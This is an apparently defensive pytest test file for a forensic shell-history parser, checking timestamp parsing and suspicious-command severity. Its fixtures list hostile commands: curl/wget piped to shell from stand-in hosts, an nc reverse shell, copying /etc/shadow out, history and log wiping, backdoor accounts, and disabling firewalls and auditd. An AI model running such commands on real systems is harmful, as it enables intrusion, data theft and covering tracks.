"""Shell history parser (spec category 8).

Three on-disk formats and three very different evidential values:
  plain bash history has NO timestamps at all - file order is the only
  temporal evidence, so order must be preserved via raw_line_offset and the
  timestamp fields must stay null rather than be invented;
  bash with HISTTIMEFORMAT writes '#<epoch>' comment lines;
  zsh extended history writes ': <epoch>:<elapsed>;<command>'.
"""
from pathlib import Path

import pytest

from lfa.parsers.base import ParseContext
from lfa.parsers.shellhist import ShellHistParser
from lfa.schema import validate
from lfa.timeeng import TimeContext

FIXTURES = Path(__file__).resolve().parent / "fixtures" / "useractivity"


@pytest.fixture
def ctx():
    return ParseContext(
        case_id="C1",
        host_id="H1",
        raw_host_dir=FIXTURES,
        time_ctx=TimeContext("Asia/Karachi", "etc_localtime"),
        distro_profile={"distro_id": "debian"},
        artifact_sha256="a" * 64,
    )


def parse(ctx, rel, path=None):
    parser = ShellHistParser()
    ctx.artifact_rel = rel
    ctx.parser_name = parser.name
    ctx.parser_version = parser.version
    events = list(parser.parse(Path(path or (FIXTURES / rel)), ctx))
    for ev in events:
        assert validate(ev) == [], ev
    return events


def test_parser_claims_history_files():
    p = ShellHistParser()
    for rel in (
        "home/alice/.bash_history",
        "root/.bash_history",
        "home/alice/.zsh_history",
        "root/.zsh_history",
        "home/alice/.history",
        "home/alice/.python_history",
        "home/alice/.mysql_history",
    ):
        assert p.can_parse(rel, {}), rel
    assert not p.can_parse("var/log/auth.log", {})


# --------------------------------------------------- (a) plain bash history

def test_plain_history_has_no_timestamps_but_keeps_order(ctx):
    events = parse(ctx, "home/alice/.bash_history")
    assert len(events) == 6
    for ev in events:
        assert ev.timestamp_utc is None
        assert ev.timestamp_local is None
        assert ev.timestamp_confidence == "unknown"
        assert ev.event_kind == "event"
        assert ev.category == "user_activity"
        assert ev.actor_user == "alice"
    offsets = [e.raw_line_offset for e in events]
    assert offsets == sorted(offsets)
    assert len(set(offsets)) == len(offsets)
    assert events[0].raw_line == "ls -la"
    assert events[-1].raw_line == "history -c"


def test_plain_history_commands_and_suspicion(ctx):
    events = parse(ctx, "home/alice/.bash_history")
    by_cmd = {e.raw_line: e for e in events}
    assert by_cmd["ls -la"].subcategory == "shell_command"
    assert by_cmd["ls -la"].severity == "info"

    pipe = by_cmd["curl http://203.0.113.9/x.sh | bash"]
    assert pipe.subcategory == "suspicious_command"
    assert pipe.severity == "high"

    assert by_cmd["history -c"].severity == "high"
    assert by_cmd["base64 -d /tmp/payload.b64 > /tmp/p"].severity == "medium"
    assert by_cmd["chmod +x /tmp/p"].severity == "medium"


# ------------------------------------------- (b) bash with HISTTIMEFORMAT

def test_bash_epoch_comments_produce_exact_timestamps(ctx):
    events = parse(ctx, "home/bob/.bash_history")
    assert len(events) == 4
    first = events[0]
    assert first.raw_line == "whoami"
    assert first.actor_user == "bob"
    assert first.timestamp_confidence == "exact"
    assert first.timestamp_utc == "2024-03-14T02:19:07+00:00"
    assert first.timestamp_local == "2024-03-14T07:19:07+05:00"
    assert all(e.timestamp_utc is not None for e in events)


def test_bash_epoch_history_flags_persistence_commands(ctx):
    events = parse(ctx, "home/bob/.bash_history")
    useradd = next(e for e in events if "useradd" in e.raw_line)
    assert useradd.subcategory == "suspicious_command"
    assert useradd.severity == "high"
    keys = next(e for e in events if "authorized_keys" in e.raw_line)
    assert keys.severity == "high"
    benign = next(e for e in events if e.raw_line == "ls /var/log")
    assert benign.subcategory == "shell_command"


# ------------------------------------------------ (c) zsh extended history

def test_zsh_extended_history(ctx):
    events = parse(ctx, "root/.zsh_history")
    assert len(events) == 4
    assert all(e.actor_user == "root" for e in events)
    first = events[0]
    assert first.raw_line == "uname -a"
    assert first.timestamp_confidence == "exact"
    assert first.timestamp_utc == "2024-03-14T02:23:20+00:00"

    nc = next(e for e in events if e.raw_line.startswith("nc -e"))
    assert nc.severity == "high"
    stop = next(e for e in events if "systemctl stop auditd" in e.raw_line)
    assert stop.severity == "high"


def test_suspicious_patterns_matrix(ctx, tmp_path):
    high = [
        "wget http://evil.tld/a.sh | sh",
        "nc -e /bin/bash 10.0.0.9 9001",
        "history -c",
        "rm -rf ~/.bash_history",
        "> ~/.bash_history",
        "shred -u /var/log/wtmp",
        "chattr +i /etc/passwd",
        "echo key >> ~/.ssh/authorized_keys",
        "useradd -m intruder",
        "usermod -aG sudo intruder",
        "iptables -F",
        "systemctl disable ufw",
        "systemctl stop fail2ban",
    ]
    medium = [
        "echo aGVsbG8= | base64 -d",
        "chmod +x /tmp/dropper",
        "curl http://198.51.100.4/beacon",
        "scp /etc/shadow root@198.51.100.4:/tmp/",
        "rsync -az /home/ backup@203.0.113.5:/backup/",
        "echo TVqQAAMAAAAEAAAA1234567890abcdefGHIJKLMNOPqrstuvwxyz0987654321AAAA",
    ]
    hist = tmp_path / ".bash_history"
    hist.write_text("\n".join(high + medium) + "\n", encoding="utf-8")
    events = parse(ctx, "home/carol/.bash_history", path=hist)
    got = {e.raw_line: e for e in events}
    for cmd in high:
        assert got[cmd].severity == "high", cmd
        assert got[cmd].subcategory == "suspicious_command", cmd
    for cmd in medium:
        assert got[cmd].severity == "medium", cmd
        assert got[cmd].subcategory == "suspicious_command", cmd


def test_root_and_other_history_files_get_the_right_actor(ctx, tmp_path):
    p = tmp_path / "hist"
    p.write_text("select * from users;\n", encoding="utf-8")
    ev = parse(ctx, "home/dave/.mysql_history", path=p)[0]
    assert ev.actor_user == "dave"
    ev = parse(ctx, "root/.bash_history", path=p)[0]
    assert ev.actor_user == "root"


def test_blank_lines_and_binary_junk_do_not_raise(ctx, tmp_path):
    p = tmp_path / ".bash_history"
    p.write_bytes(b"ls\n\n   \n\x00\xff\xfe\x80junk\n#notanepoch\n: bad:0;x\n")
    events = parse(ctx, "home/eve/.bash_history", path=p)
    assert any(e.raw_line == "ls" for e in events)


def test_empty_history_file_yields_nothing(ctx, tmp_path):
    p = tmp_path / ".bash_history"
    p.write_bytes(b"")
    assert parse(ctx, "home/eve/.bash_history", path=p) == []
